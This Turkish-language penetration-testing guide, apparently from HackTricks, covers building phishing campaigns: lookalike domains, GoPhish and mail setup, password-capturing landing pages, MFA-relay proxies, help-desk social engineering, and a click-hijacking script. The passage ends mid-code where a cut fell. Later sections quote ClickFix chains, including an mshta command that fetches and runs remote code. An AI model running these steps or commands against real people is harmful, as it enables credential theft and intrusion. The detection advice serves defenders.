# Phishing Metodolojisi

{{#include ../../banners/hacktricks-training.md}}

## Metodoloji

1. Kurbanı araştırın
   1. **Kurban domainini** seçin.
   2. Kurbanın kullandığı **login portallarını arayarak** temel web keşfi yapın ve hangisini **taklit edeceğinize** **karar verin**.
   3. E-posta adreslerini **bulmak** için **OSINT** kullanın.
2. Ortamı hazırlayın
   1. Phishing değerlendirmesinde kullanacağınız **domaini satın alın**
   2. E-posta hizmetiyle ilgili kayıtları (SPF, DMARC, DKIM, rDNS) **yapılandırın**
   3. VPS'i **gophish** ile yapılandırın
3. Kampanyayı hazırlayın
   1. **E-posta şablonunu** hazırlayın
   2. Kimlik bilgilerini çalmak için **web sayfasını** hazırlayın
4. Kampanyayı başlatın!

## Benzer domain adları oluşturun veya güvenilir bir domain satın alın

### Domain Adı Değiştirme Teknikleri

- **Anahtar kelime**: Domain adı, orijinal domainin önemli bir **anahtar kelimesini içerir** (örn. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Tireli alt domain**: Bir alt domainin **noktasını tireyle değiştirin** (örn. www-zelster.com).
- **Yeni TLD**: Yeni bir **TLD** kullanan aynı domain (örn. zelster.org)
- **Homoglyph**: Domain adındaki bir harfi **benzer görünen harflerle değiştirir** (örn. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Harflerin yerini değiştirme:** Domain adındaki **iki harfin yerini değiştirir** (örn. zelsetr.com).
- **Tekilleştirme/Çoğullaştırma**: Domain adının sonuna “s” ekler veya sondaki “s” harfini kaldırır (örn. zeltsers.com).
- **Harf çıkarma**: Domain adındaki harflerden **birini kaldırır** (örn. zelser.com).
- **Harf yineleme:** Domain adındaki harflerden **birini yineler** (örn. zeltsser.com).
- **Harf değiştirme**: Homoglyph'e benzer ancak daha az gizlidir. Domain adındaki harflerden birini, örneğin klavyede orijinal harfin yakınındaki bir harfle değiştirir (örn. zektser.com).
- **Alt domain ekleme**: Domain adının içine bir **nokta** ekler (örn. ze.lster.com).
- **Harf ekleme**: Domain adına **bir harf ekler** (örn. zerltser.com).
- **Noktanın eksik olması**: TLD'yi domain adına ekler (örn. zelstercom.com)

**Otomatik Araçlar**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Web Siteleri**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Güneş patlamaları, kozmik ışınlar veya donanım hataları gibi çeşitli etkenler nedeniyle depolanan ya da iletişim hâlindeki bitlerden bazılarının **otomatik olarak tersine dönme olasılığı** vardır.

Bu kavram **DNS isteklerine uygulandığında**, DNS sunucusunun **aldığı domainin** başlangıçta istenen domainle aynı olmaması mümkündür.

Örneğin, "windows.com" domainindeki tek bir bitin değişmesi, domaini "windnws.com" hâline getirebilir.

Saldırganlar, kurbanın domainine benzeyen ve bitflipping ile oluşturulmuş birden fazla domaini kaydederek bundan **yararlanabilir**. Amaçları, meşru kullanıcıları kendi altyapılarına yönlendirmektir.

Daha fazla bilgi için [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) adresini okuyun.<sup>[[10]](#references)[[11]](#references)</sup>

### Güvenilir bir domain satın alın

Kullanabileceğiniz süresi dolmuş bir domain aramak için [https://www.expireddomains.net/](https://www.expireddomains.net) adresinde arama yapabilirsiniz.\
Satın alacağınız süresi dolmuş domainin **zaten iyi bir SEO değerine sahip olduğundan** emin olmak için şu sitelerde nasıl kategorize edildiğini arayabilirsiniz:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## E-posta Adreslerini Keşfetme

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (%100 ücretsiz)
- [https://phonebook.cz/](https://phonebook.cz) (%100 ücretsiz)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Daha fazla geçerli e-posta adresi **keşfetmek** veya daha önce bulduklarınızı **doğrulamak** için kurbanın SMTP sunucularında brute-force yapıp yapamayacağınızı kontrol edebilirsiniz. [E-posta adreslerini doğrulamayı/keşfetmeyi buradan öğrenin](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ayrıca, kullanıcıların e-postalarına erişmek için **herhangi bir web portalı kullanıp kullanmadığını** kontrol etmeyi unutmayın. Bu portalın **username brute force** saldırısına karşı savunmasız olup olmadığını kontrol edebilir ve mümkünse güvenlik açığından yararlanabilirsiniz.

## GoPhish'i Yapılandırma

### Kurulum

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) adresinden indirebilirsiniz.

İndirin, `/opt/gophish` içine açın ve `/opt/gophish/gophish` dosyasını çalıştırın.\
Çıktıda 3333 numaralı porttaki admin kullanıcısı için bir parola verilecektir. Bu nedenle o porta erişin ve admin parolasını değiştirmek için bu kimlik bilgilerini kullanın. Bu portu yerel makineye tünellemeniz gerekebilir:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Yapılandırma

**TLS sertifikası yapılandırması**

Bu adımdan önce kullanacağınız **alan adını satın almış** olmanız ve alan adının, **gophish** yapılandırmasını yaptığınız VPS'nin **IP adresini göstermesi** gerekir.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Mail yapılandırması**

Kuruluma başlayın: `apt-get install postfix`

Ardından domaini aşağıdaki dosyalara ekleyin:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** içindeki aşağıdaki değişkenlerin değerlerini de değiştirin:

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Son olarak **`/etc/hostname`** ve **`/etc/mailname`** dosyalarını domain adınızla değiştirin ve **VPS'nizi yeniden başlatın.**

Şimdi, VPS'nin **IP adresine** yönlendiren bir `mail.<domain>` **DNS A kaydı** ve `mail.<domain>` adresine yönlendiren bir **DNS MX kaydı** oluşturun.

Şimdi bir e-posta göndermeyi test edelim:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Gophish yapılandırması**

Gophish'in çalışmasını durdurun ve yapılandıralım.\
`/opt/gophish/config.json` dosyasını aşağıdaki gibi değiştirin (https kullanımına dikkat edin):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**gophish service'ini yapılandırma**

gophish service'ini otomatik olarak başlatılabilecek ve bir service olarak yönetilebilecek şekilde oluşturmak için `/etc/init.d/gophish` dosyasını aşağıdaki içerikle oluşturabilirsiniz:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Hizmetin yapılandırmasını tamamlamak ve kontrol etmek için şunları yapın:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## E-posta sunucusunu ve domain'i yapılandırma

### Bekleyin ve güvenilir olun

Bir domain ne kadar eskiyse spam olarak algılanma olasılığı o kadar düşer. Bu nedenle phishing değerlendirmesinden önce mümkün olduğunca uzun süre (en az 1 hafta) beklemelisiniz. Ayrıca, itibarlı bir sektöre ait bir sayfa eklerseniz elde edeceğiniz itibar daha yüksek olur.

Bir hafta beklemeniz gerekse bile her şeyi şimdi yapılandırmayı bitirebileceğinizi unutmayın.

### Reverse DNS (rDNS) kaydını yapılandırma

VPS'nin IP adresini domain adına çözen bir rDNS (PTR) kaydı ayarlayın.

### Sender Policy Framework (SPF) kaydı

Yeni domain için bir **SPF kaydı yapılandırmalısınız**. SPF kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

SPF politikanızı oluşturmak için [https://www.spfwizard.net/](https://www.spfwizard.net) adresini kullanabilirsiniz (VPS makinesinin IP adresini kullanın).

![Phishing domain'i için SPF kaydı oluşturmaya yönelik SPF Wizard formu](<../../images/image (1037).png>)

Domain içindeki bir TXT kaydına ayarlanması gereken içerik şudur:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Domain-based Message Authentication, Reporting & Conformance (DMARC) Kaydı

**Yeni domain için bir DMARC kaydı yapılandırmalısınız**. DMARC kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Aşağıdaki içeriğe sahip yeni bir DNS TXT kaydı oluşturup hostname olarak `_dmarc.<domain>` değerini belirtmelisiniz:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

**Yeni domain için bir DKIM yapılandırmalısınız**. DKIM kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Bu eğitim şu kaynağı temel alır: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> DKIM anahtarının oluşturduğu her iki B64 değerini birleştirmeniz gerekir:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### E-posta yapılandırma puanınızı test edin

Bunu [https://www.mail-tester.com/](https://www.mail-tester.com) kullanarak yapabilirsiniz\
Sayfaya gidip size verilen adrese bir e-posta gönderin:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Ayrıca `check-auth@verifier.port25.com` adresine bir e-posta gönderip **yanıtı okuyarak** e-posta yapılandırmanızı da **kontrol edebilirsiniz** (bunun için **25** numaralı portu açmanız ve e-postayı root olarak gönderdiyseniz _/var/mail/root_ dosyasındaki yanıtı görmeniz gerekir).\
Tüm testleri geçtiğinizden emin olun:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Ayrıca kontrolünüz altındaki bir Gmail adresine **mesaj gönderebilir** ve Gmail gelen kutunuzdaki **e-posta başlıklarını** kontrol edebilirsiniz; `Authentication-Results` başlık alanında `dkim=pass` bulunmalıdır.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Spamhaus Kara Listesinden Çıkarma

[www.mail-tester.com](https://www.mail-tester.com) sayfası, alan adınızın Spamhaus tarafından engellenip engellenmediğini gösterebilir. Alan adınızın/IP'nizin listeden çıkarılmasını şu adresten talep edebilirsiniz: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Kara Listesinden Çıkarma

​​Alan adınızın/IP'nizin listeden çıkarılmasını [https://sender.office.com/](https://sender.office.com) adresinden talep edebilirsiniz.

## GoPhish Kampanyası Oluşturma ve Başlatma

### Gönderim Profili

- Gönderici profilini **tanımlayacak bir ad** belirleyin
- Phishing e-postalarını hangi hesaptan göndereceğinize karar verin. Öneriler: _noreply, support, servicedesk, salesforce..._
- Kullanıcı adı ve parolayı boş bırakabilirsiniz, ancak Ignore Certificate Errors seçeneğini işaretlediğinizden emin olun

![GoPhish Kampanyası Oluşturma ve Başlatma - Gönderim Profili: Kullanıcı adı ve parolayı boş bırakabilirsiniz, ancak Ignore Certificate Errors seçeneğini işaretlediğinizden emin olun](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Her şeyin çalıştığını test etmek için "**Send Test Email**" işlevini kullanmanız önerilir.\
> Test yaparken kara listeye alınmamak için test e-postalarını **10min mail adreslerine göndermenizi** öneririm.

### E-posta Şablonu

- Şablonu **tanımlayacak bir ad** belirleyin
- Ardından bir **konu** yazın (alışılmadık bir şey olmasın, normal bir e-postada görmeyi bekleyebileceğiniz bir şey olsun)
- "**Add Tracking Image**" seçeneğinin işaretli olduğundan emin olun
- **E-posta şablonunu** yazın (aşağıdaki örnekteki gibi değişkenler kullanabilirsiniz):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Email'in **inandırıcılığını artırmak için**, müşteriden gelen bir e-postadaki imzanın kullanılması önerilir. Öneriler:

- **Var olmayan bir adrese** e-posta gönderin ve yanıtta imza olup olmadığını kontrol edin.
- info@ex.com, press@ex.com veya public@ex.com gibi **herkese açık e-posta adreslerini** bulun, bunlara e-posta gönderin ve yanıtı bekleyin.
- Bulduğunuz **geçerli e-posta adreslerinden** birine ulaşmayı deneyin ve yanıtı bekleyin

![Gönderim Profili - E-posta Şablonu: Bulduğunuz geçerli e-posta adreslerinden birine ulaşmayı deneyin ve yanıtı bekleyin](<../../images/image (80).png>)

> [!TIP]
> E-posta Şablonu, **gönderilecek dosyaları eklemenize** de olanak tanır. Özel hazırlanmış dosyalar/belgeler kullanarak NTLM challenge'larını çalmak istiyorsanız [bu sayfayı okuyun](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Açılış Sayfası

- Bir **ad** yazın
- Web sayfasının **HTML kodunu yazın**. Web sayfalarını **içe aktarabileceğinizi** unutmayın.
- **Gönderilen Verileri Yakala** ve **Parolaları Yakala** seçeneklerini işaretleyin
- Bir **yönlendirme** belirleyin

![E-posta Şablonu - Açılış Sayfası: Gönderilen Verileri Yakala ve Parolaları Yakala seçeneklerini işaretleyin](<../../images/image (826).png>)

> [!TIP]
> Genellikle sayfanın HTML kodunu değiştirmeniz ve sonuçtan **memnun kalana kadar** yerel ortamda (belki bir Apache sunucusu kullanarak) bazı testler yapmanız gerekir. Ardından bu HTML kodunu kutuya yazın.\
> HTML için **statik kaynaklar** (örneğin CSS ve JS sayfaları) kullanmanız gerekiyorsa bunları _**/opt/gophish/static/endpoint**_ konumuna kaydedebilir ve ardından _**/static/\<filename>**_ üzerinden erişebilirsiniz.

> [!TIP]
> Yönlendirme için **kullanıcıları kurbanın gerçek ana web sayfasına yönlendirebilir** veya örneğin onları _/static/migration.html_ sayfasına yönlendirebilir, 5 saniyeliğine bir **dönen yükleme simgesi** ([**https://loading.io/**](https://loading.io)**) gösterip ardından işlemin başarılı olduğunu belirtebilirsiniz**.

### Kullanıcılar ve Gruplar

- Bir ad belirleyin
- **Verileri içe aktarın** (örnekteki şablonu kullanmak için her kullanıcının ad, soyad ve e-posta adresine ihtiyacınız olduğunu unutmayın)

![Açılış Sayfası - Kullanıcılar ve Gruplar: Verileri içe aktarın (örnekteki şablonu kullanmak için her kullanıcının ad, soyad ve e-posta adresine ihtiyacınız olduğunu unutmayın)](<../../images/image (163).png>)

### Kampanya

Son olarak, bir ad, e-posta şablonu, açılış sayfası, URL, gönderim profili ve grup seçerek bir kampanya oluşturun. URL'nin kurbanlara gönderilecek bağlantı olacağını unutmayın.

**Gönderim Profilinin, son phishing e-postasının nasıl görüneceğini görmek için bir test e-postası göndermenize olanak tanıdığını** unutmayın:

![Kullanıcılar ve Gruplar - Kampanya: Gönderim Profilinin, son phishing e-postasının nasıl görüneceğini görmek için bir test e-postası göndermenize olanak tanıdığını unutmayın](<../../images/image (192).png>)

Her şey hazır olduğunda kampanyayı başlatmanız yeterli!

## Web Sitesini Klonlama

Herhangi bir nedenle web sitesini klonlamak istiyorsanız aşağıdaki sayfaya göz atın:


{{#ref}}
clone-a-website.md
{{#endref}}

## Arka Kapı Eklenmiş Belgeler ve Dosyalar

Bazı phishing değerlendirmelerinde (özellikle Red Team çalışmalarında) **bir tür arka kapı içeren dosyalar** (belki bir C2 veya yalnızca kimlik doğrulamayı tetikleyecek bir şey) göndermek de isteyebilirsiniz.\
Bazı örnekler için aşağıdaki sayfaya göz atın:


{{#ref}}
phishing-documents.md
{{#endref}}

## MFA Phishing

### Proxy MitM ile

Önceki saldırı oldukça zekice; gerçek bir web sitesini taklit edip kullanıcının girdiği bilgileri topluyorsunuz. Ne yazık ki kullanıcı doğru parolayı girmediyse veya taklit ettiğiniz uygulama 2FA ile yapılandırılmışsa, **bu bilgiler kandırılan kullanıcıyı taklit etmenize olanak sağlamaz**.

[**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) ve [**muraena**](https://github.com/muraenateam/muraena) gibi araçlar bu noktada işe yarar. Bu araç, MitM benzeri bir saldırı gerçekleştirmenizi sağlar. Temel olarak saldırı şu şekilde işler:

1. Gerçek web sayfasındaki **oturum açma** formunu taklit edersiniz.
2. Kullanıcı **kimlik bilgilerini** sahte sayfanıza **gönderir**; araç da bunları gerçek web sayfasına göndererek **kimlik bilgilerinin işe yarayıp yaramadığını kontrol eder**.
3. Hesap **2FA** ile yapılandırılmışsa MitM sayfası bunu ister ve **kullanıcı girdiğinde** araç bunu gerçek web sayfasına gönderir.
4. Kullanıcı kimliğini doğruladıktan sonra, araç MitM gerçekleştirirken siz (saldırgan olarak) **kimlik bilgilerini, 2FA'yı, çerezi ve etkileşimler sırasında elde edilen tüm bilgileri** yakalamış olursunuz.

### VNC ile

Kurbanı orijinaline benzeyen **kötü amaçlı bir sayfaya göndermek** yerine, onu gerçek web sayfasına bağlı bir tarayıcının bulunduğu bir **VNC oturumuna** gönderseydiniz ne olurdu? Yaptıklarını görebilir, parolayı, kullanılan MFA'yı, çerezleri çalabilirsiniz...\
Bunu [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) ile yapabilirsiniz.<sup>[[3]](#references)[[4]](#references)</sup>

## Tespiti tespit etme

Ele verilip verilmediğinizi anlamanın en iyi yollarından biri, **alan adınızı kara listelerde aramaktır**. Listede görünüyorsa alan adınız bir şekilde şüpheli olarak tespit edilmiştir.\
Alan adınızın herhangi bir kara listede olup olmadığını kontrol etmenin kolay bir yolu [https://malwareworld.com/](https://malwareworld.com) adresini kullanmaktır.

Ancak aşağıda açıklandığı gibi, kurbanın **gerçek ortamda şüpheli phishing etkinliklerini aktif olarak arayıp aramadığını** anlamanın başka yolları da vardır:


{{#ref}}
detecting-phising.md
{{#endref}}

Kurbanın alan adına **çok benzeyen bir alan adı satın alabilir** ve/veya sizin kontrolünüzdeki bir alan adının **alt alan adı** için, kurbanın alan adındaki **anahtar kelimeyi içeren** bir sertifika oluşturabilirsiniz. Kurban bu alan adlarıyla herhangi bir **DNS veya HTTP etkileşimi** gerçekleştirirse, şüpheli alan adlarını **aktif olarak aradığını** anlarsınız ve çok gizli hareket etmeniz gerekir.<sup>[[2]](#references)</sup>

### Phishing'i değerlendirme

E-postanızın spam klasörüne düşüp düşmeyeceğini, engellenip engellenmeyeceğini veya başarılı olup olmayacağını değerlendirmek için [**Phishious** ](https://github.com/Rices/Phishious)kullanın.

## Üst Düzey Kimlik İhlali (Yardım Masası MFA Sıfırlaması)

Modern saldırı grupları, MFA'yı aşmak için giderek daha fazla e-posta tuzaklarını tamamen atlayıp **doğrudan servis masası / kimlik kurtarma iş akışını hedef alıyor**. Saldırı tamamen "living-off-the-land" yöntemini kullanır: Operatör geçerli kimlik bilgilerini ele geçirdikten sonra yerleşik yönetim araçlarıyla ilerler; kötü amaçlı yazılım gerekmez.<sup>[[6]](#references)</sup>

### Saldırı akışı
1. Kurban hakkında bilgi toplayın 
   * LinkedIn, veri ihlalleri, herkese açık GitHub vb. kaynaklardan kişisel ve kurumsal bilgileri derleyin.  
   * Değerli kimlikleri (yöneticiler, BT, finans) belirleyin ve parola / MFA sıfırlama için **tam yardım masası sürecini** öğrenin.
2. Gerçek zamanlı sosyal mühendislik  
   * Hedefi taklit ederek yardım masasına telefon edin, Teams veya sohbet üzerinden ulaşın (genellikle **sahte arayan kimliği** ya da **klonlanmış ses** kullanarak).  
   * Bilgiye dayalı doğrulamayı geçmek için önceden toplanmış kişisel tanımlayıcı bilgileri (PII) verin.  
   * Görevliyi **MFA sırrını sıfırlamaya** veya kayıtlı bir cep telefonu numarasına **SIM-swap** uygulamaya ikna edin.
3. Erişim sonrası hemen yapılacaklar (gerçek vakalarda ≤60 dakika)  
   * Herhangi bir web SSO portalı üzerinden bir dayanak noktası oluşturun.  
   * İkili dosya bırakmadan yerleşik araçlarla AD / AzureAD'yi numaralandırın:
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Ortamda zaten izin verilen **WMI**, **PsExec** veya meşru **RMM** ajanlarıyla yanal hareket.

### Tespit ve Azaltma
* Yardım masası üzerinden kimlik kurtarma işlemlerini **ayrıcalıklı bir işlem** olarak ele alın; ek kimlik doğrulama ve yönetici onayı isteyin.
* Şunlar için uyarı veren **Identity Threat Detection & Response (ITDR)** / **UEBA** kuralları dağıtın:  
  * MFA yöntemi değişikliği + yeni cihazdan / coğrafi konumdan kimlik doğrulama.  
  * Aynı principal’ın anında yetki yükseltmesi (kullanıcı-→-yönetici).
* Yardım masası aramalarını kaydedin ve herhangi bir sıfırlama işleminden önce **önceden kayıtlı bir numaraya geri arama** yapılmasını zorunlu kılın.
* Yeni sıfırlanan hesapların yüksek ayrıcalıklı token’ları **otomatik olarak devralmaması** için **Just-In-Time (JIT) / Privileged Access** uygulayın.

---

## Ölçekli Aldatma – SEO Poisoning ve “ClickFix” Kampanyaları
Commodity ekipler, **arama motorlarını ve reklam ağlarını dağıtım kanalına** dönüştüren kitlesel saldırılarla yoğun insan müdahalesi gerektiren operasyonların maliyetini dengeler.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising**, `chromium-update[.]site` gibi sahte bir sonucu arama reklamlarında en üst sıraya taşır.
2. Kurban küçük bir **ilk aşama loader** indirir (genellikle JS/HTA/ISO). Unit 42'nin gözlemlediği örnekler:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Loader, tarayıcı çerezlerini ve kimlik bilgisi veritabanlarını dışarı sızdırır, ardından *gerçek zamanlı olarak* şunlardan hangisinin dağıtılacağına karar veren bir **sessiz loader** indirir:
   * RAT (ör. AsyncRAT, RustDesk)
   * ransomware / wiper
   * kalıcılık bileşeni (registry Run key + zamanlanmış görev)

### Güvenliği güçlendirme ipuçları
* Yeni kaydedilmiş alan adlarını engelleyin ve e-postanın yanı sıra *arama reklamlarında* da **Advanced DNS / URL Filtering** uygulayın.
* Yazılım yüklemelerini imzalı MSI / Store paketleriyle kısıtlayın; ilkeyle `HTA`, `ISO`, `VBS` çalıştırılmasını engelleyin.
* Yükleyicileri açan tarayıcı alt süreçlerini izleyin:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* First-stage loader'lar tarafından sıkça kötüye kullanılan LOLBin'leri araştırın (ör. `regsvr32`, `curl`, `mshta`).

### TDS aktarımıyla indirme düğmesi tıklamasını ele geçirme
Bazı sahte yazılım portalları, görünür indirme `href` değerini **gerçek** GitHub/release URL'sine yönelmiş halde tutar ancak JavaScript ile kullanıcının **ilk** etkileşimini ele geçirip kurbanı bunun yerine bir **Traffic Distribution System (TDS)** zincirine yönlendirir.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Temel özellikler:
- Hook genellikle `document` üzerinde **capture phase** (`true`) aşamasında çalışır; böylece site handler'larından önce tetiklenir.
- Chrome, redirect'i geçerli bir **user gesture** ile ilişkili tutmak ve popup-blocker bypass olasılığını artırmak için genellikle `click` yerine `mousedown` kullanır.
- Bazı varyantlar önceden `about:blank` açar veya `<a target="_blank">` tıklamalarını taklit eder ve TDS URL'sini ancak daha sonra atar.
- Browser-side limitler genellikle `localStorage`'da tutulur; bu nedenle **ilk tıklama** malware'e ulaşabilirken yenileme/yeniden denemeler, zararsız görünen görünür bağlantıya yönlenebilir.
- TDS; referrer, giriş domain'i, GEO, browser/device fingerprint, VPN/datacenter kontrolleri, tıklama bağlamı ve oturum başına sayaçlara göre filtre uygulayabilir; bu da analistlerin tekrarlarını deterministik olmaktan çıkarır.

Savunma önerileri:
- Tıklama anında oluşturulan **gerçek** gezinme hedefini, **görüntülenen** `href` ile karşılaştırın.
- `window.open`, `about:blank` veya taklit edilmiş anchor tıklamaları etrafında hem `preventDefault()` hem de `stopImmediatePropagation()` çağıran `document.addEventListener(..., true)` handler'larını arayın.
- Aynı CloudFront/JS aşamasını yükleyen, yeni kaydedilmiş yazılım indirme domain'lerinden oluşan kümeleri yüksek sinyalli bir SEO poisoning/TDS örüntüsü olarak değerlendirin.

### Sahte doğrulama sayfalarından ClickFix + arşiv görünümündeki LOLBAS indirmeleri
Bazı TDS dalları, kurbandan aşağıdaki gibi güvenilir bir Windows binary'sini çalıştırmasını isteyen sahte bir doğrulama sayfasında (Cloudflare/IUAM tarzı) sonlanır:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notes:
- `mshta.exe`, URL bir `.7z` arşivi gibi görünse bile yanıtın başındaki **HTA/VBScript** kodunu çalıştırır; sonuna eklenen arşiv verisi tamamen bir şaşırtmaca olabilir.
- Sonraki aşamalar genellikle dosya türü hakkında yalan söylemeye devam eder (`.rtf` ile PowerShell, `.asar` ile Python, eklenmiş ikili dosyalar içeren ZIP'ler) ve ardından **manual PE mapping / in-memory execution** aşamasına geçer.
- Bu zincirlerden birine müdahale ediyorsanız, **ilk başarılı çalıştırmadan itibaren ağ + bellek verilerini** koruyun: sonraki tekrarlar yalnızca zararsız bir installer/SFX yolunu gösterebilir veya payload/key release orijinal TDS oturumuna bağlı olduğundan başarısız olabilir.

### ClickFix DLL delivery tradecraft (sahte CERT güncellemesi)
* Yem: **Update** düğmesiyle adım adım “düzeltme” talimatları gösteren, klonlanmış ulusal CERT duyurusu. Kurbanlara DLL indiren ve bunu `rundll32` aracılığıyla çalıştıran bir batch dosyasını çalıştırmaları söylenir.<sup>[[12]](#references)</sup>
* Gözlemlenen tipik batch zinciri:
  ```cmd
